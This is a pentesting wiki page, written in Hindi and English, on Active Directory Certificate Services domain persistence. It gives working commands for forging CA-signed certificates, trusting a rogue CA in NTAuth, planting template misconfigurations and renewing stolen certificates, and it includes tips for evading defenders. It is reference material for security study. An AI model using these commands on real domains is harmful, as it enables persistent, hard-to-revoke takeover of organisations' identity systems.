# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**यह [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) में साझा की गई domain persistence techniques का सारांश है**। अधिक जानकारी के लिए इसे देखें।<sup>[[5]](#references)</sup>

## Stolen CA Certificates से Certificates Forging करना (Golden Certificate) - DPERSIST1

आप कैसे पता लगा सकते हैं कि कोई certificate CA certificate है?

यदि कई conditions पूरी होती हैं, तो यह निर्धारित किया जा सकता है कि कोई certificate CA certificate है:<sup>[[5]](#references)</sup>

- Certificate CA server पर stored होता है, जिसकी private key machine के DPAPI द्वारा, या यदि operating system support करता है तो TPM/HSM जैसे hardware द्वारा secured होती है।
- Certificate के Issuer और Subject दोनों fields CA के distinguished name से match करते हैं।
- CA certificates में exclusively एक "CA Version" extension मौजूद होता है।
- Certificate में Extended Key Usage (EKU) fields नहीं होती हैं।

इस certificate की private key extract करने के लिए CA server पर `certsrv.msc` tool, built-in GUI के माध्यम से, supported method है। फिर भी, यह certificate system में stored अन्य certificates से अलग नहीं होता; इसलिए extraction के लिए [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) जैसी methods लागू की जा सकती हैं।

Certificate और private key को निम्न command के साथ Certipy का उपयोग करके भी प्राप्त किया जा सकता है:<sup>[[2]](#references)</sup>
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
`.pfx` format में CA certificate और उसकी private key प्राप्त करने के बाद, [ForgeCert](https://github.com/GhostPack/ForgeCert) जैसे tools का उपयोग valid certificates generate करने के लिए किया जा सकता है:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Certificate forgery के लिए targeted user active होना चाहिए और Active Directory में authenticate करने में सक्षम होना चाहिए, तभी process सफल होगा। krbtgt जैसे special accounts के लिए certificate forge करना ineffective है।

यह forged certificate निर्दिष्ट end date तक और **जब तक root CA certificate valid है**, तब तक **valid** रहेगा (आमतौर पर 5 से **10+ years** तक)। यह **machines** के लिए भी valid है, इसलिए **S4U2Self** के साथ combined होने पर attacker **किसी भी domain machine पर persistence बनाए रख सकता है**, जब तक CA certificate valid है।\
इसके अलावा, इस method से **generated certificates** को **revoke नहीं किया जा सकता**, क्योंकि CA इनके बारे में aware नहीं होता।

### Strong Certificate Mapping Enforcement (2025+) के अंतर्गत operating करना

February 11, 2025 से (KB5014754 rollout के बाद), domain controllers certificates mappings के लिए default रूप से **Full Enforcement** पर हैं। Practical रूप से इसका मतलब है कि आपके forged certificates को इनमें से किसी एक शर्त को पूरा करना होगा:

- Target account से strong binding contain करना (उदाहरण के लिए, SID security extension), या
- Target object के `altSecurityIdentities` attribute पर strong, explicit mapping के साथ paired होना।<sup>[[1]](#references)</sup>

Persistence के लिए एक reliable approach है कि stolen Enterprise CA से chained forged certificate mint करें और फिर victim principal पर strong explicit mapping add करें:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
नोट्स
- यदि आप ऐसे forged certificates बना सकते हैं जिनमें SID security extension शामिल हो, तो वे Full Enforcement में भी implicitly map होंगे। अन्यथा, explicit strong mappings को प्राथमिकता दें। explicit mappings के बारे में अधिक जानकारी के लिए [account-persistence](account-persistence.md) देखें।
- Revocation यहां defenders की सहायता नहीं करती: forged certificates CA database के लिए unknown होते हैं और इसलिए उन्हें revoke नहीं किया जा सकता।

#### Full-Enforcement compatible forging (SID-aware)

Updated tooling आपको SID को सीधे embed करने देता है, जिससे DCs weak mappings को reject करने पर भी golden certificates उपयोग योग्य रहते हैं:<sup>[[3]](#references)</sup>
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
SID को embed करके आप `altSecurityIdentities` को छूने से बचते हैं, जिसकी निगरानी की जा सकती है, और फिर भी strong mapping checks को पूरा करते हैं।

## Rogue CA Certificates पर भरोसा करना - DPERSIST2

`NTAuthCertificates` object को उसके `cacertificate` attribute के भीतर एक या अधिक **CA certificates** रखने के लिए परिभाषित किया गया है, जिसका उपयोग Active Directory (AD) करता है। **domain controller** द्वारा verification process में **NTAuthCertificates** object में उस entry की जांच की जाती है जो authenticating **certificate** के Issuer field में निर्दिष्ट **CA** से मेल खाती हो। Match मिलने पर authentication आगे बढ़ता है।<sup>[[5]](#references)</sup>

यदि attacker के पास इस AD object का control हो, तो वह `NTAuthCertificates` object में self-signed CA certificate जोड़ सकता है। सामान्यतः केवल **Enterprise Admin** group के members, साथ ही **forest root’s domain** में **Domain Admins** या **Administrators**, को इस object को modify करने की permission दी जाती है। वे `certutil.exe` का उपयोग करके `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` command के साथ, या [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) का उपयोग करके `NTAuthCertificates` object को edit कर सकते हैं।

इस technique के लिए कुछ additional helpful commands:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
यह capability विशेष रूप से तब relevant होती है जब इसे पहले बताए गए ForgeCert वाले method के साथ उपयोग किया जाए, जिसमें certificates को dynamically generate किया जाता है।

> Post-2025 mapping considerations: NTAuth में rogue CA रखने से केवल issuing CA पर trust स्थापित होता है। DCs के **Full Enforcement** में होने पर logon के लिए leaf certificates का उपयोग करने हेतु leaf में या तो SID security extension होना चाहिए, या target object पर strong explicit mapping होनी चाहिए (उदाहरण के लिए, `altSecurityIdentities` में Issuer+Serial)। देखें {{#ref}}account-persistence.md{{#endref}}।

## Malicious Misconfiguration - DPERSIST3

**persistence** के लिए **security descriptor modifications of AD CS** components के माध्यम से opportunities बहुत अधिक हैं। "[Domain Escalation](domain-escalation.md)" section में वर्णित modifications को elevated access वाले attacker द्वारा malicious रूप से implement किया जा सकता है। इसमें संवेदनशील components में "control rights" (जैसे, WriteOwner/WriteDACL/etc.) जोड़ना शामिल है, जैसे:<sup>[[5]](#references)</sup>

- **CA server’s AD computer** object
- **CA server’s RPC/DCOM server**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** में कोई भी **descendant AD object or container** (उदाहरण के लिए, Certificate Templates container, Certification Authorities container, NTAuthCertificates object आदि)
- **AD groups delegated rights to control AD CS** by default या organization द्वारा (जैसे, built-in Cert Publishers group और उसके कोई भी members)

Malicious implementation का एक उदाहरण ऐसा होगा जिसमें domain में **elevated permissions** रखने वाला attacker default **`User`** certificate template में **`WriteOwner`** permission जोड़ता है और attacker को उस right का principal बनाता है। इसका exploit करने के लिए attacker पहले **`User`** template का ownership स्वयं को transfer करेगा। इसके बाद, template पर **`mspki-certificate-name-flag`** को **1** पर set किया जाएगा ताकि **`ENROLLEE_SUPPLIES_SUBJECT`** enable हो सके और user को request में Subject Alternative Name provide करने की अनुमति मिले। इसके बाद attacker **template** का उपयोग करके **enroll** कर सकता है, alternative name के रूप में **domain administrator** का name चुन सकता है और प्राप्त certificate का उपयोग DA के रूप में authentication के लिए कर सकता है।

Long-term domain persistence के लिए attackers द्वारा set किए जा सकने वाले practical knobs (पूरे details और detection के लिए {{#ref}}domain-escalation.md{{#endref}} देखें):

- CA policy flags जो requesters से SAN allow करते हैं (जैसे, `EDITF_ATTRIBUTESUBJECTALTNAME2` enable करना)। इससे ESC1-like paths exploitable बने रहते हैं।
- Template DACL या settings जो authentication-capable issuance allow करती हैं (जैसे, Client Authentication EKU जोड़ना, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enable करना)।
- `NTAuthCertificates` object या CA containers को control करना, ताकि defenders द्वारा cleanup का प्रयास करने पर rogue issuers को लगातार फिर से introduce किया जा सके।

> [!TIP]
> KB5014754 के बाद hardened environments में, इन misconfigurations को explicit strong mappings (`altSecurityIdentities`) के साथ pair करने से यह सुनिश्चित होता है कि आपके द्वारा issued या forged certificates तब भी usable रहें, जब DCs strong mapping enforce करें।

### Certificate renewal abuse (ESC14) for persistence

यदि आप किसी authentication-capable certificate (या Enrollment Agent certificate) को compromise कर लेते हैं, तो आप उसे **indefinitely renew** कर सकते हैं, जब तक issuing template published रहता है और आपका CA issuer chain पर trust करता है। Renewal original identity bindings को बनाए रखते हुए validity को extend करता है, जिससे eviction कठिन हो जाता है, जब तक template को fix न किया जाए या CA को republish न किया जाए।<sup>[[4]](#references)</sup>
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
यदि domain controllers **Full Enforcement** में हैं, तो `-sid <victim SID>` जोड़ें (या ऐसा template उपयोग करें जिसमें SID security extension अभी भी शामिल हो), ताकि renewed leaf certificate `altSecurityIdentities` को बदले बिना strong mapping करता रहे। CA admin rights वाले Attackers certificate जारी करने से पहले renewed lifetimes को बढ़ाने के लिए `policy\RenewalValidityPeriodUnits` में भी बदलाव कर सकते हैं।<sup>[[2]](#references)[[4]](#references)</sup>


## संदर्भ

- [1] [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
